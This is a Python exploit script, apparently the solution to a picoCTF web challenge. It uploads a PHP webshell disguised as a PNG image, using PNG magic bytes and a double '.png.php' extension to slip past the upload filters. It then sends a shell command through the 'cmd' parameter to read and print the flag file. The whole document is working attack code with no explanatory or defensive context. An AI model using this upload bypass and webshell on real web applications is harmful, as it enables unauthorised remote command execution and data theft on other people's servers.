import requests
import re

url = "http://atlas.picoctf.net:54245"

# upload webshell
header = bytes([0x50, 0x4E, 0x47])    # bypass png header check

payload = '''<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>'''

filename = 'exploit.png.php'    # bypass name check

res = requests.post(url, files={
    'file': (
        filename,
        header + payload.encode(),
        'text/plain'
    )
})

# rce
payload = 'cat ../MFRDAZLDMUYDG.txt'
res = requests.get(f"{url}/uploads/{filename}?cmd={payload}")

print(re.findall(r'(picoCTF{.+})', res.text)[0])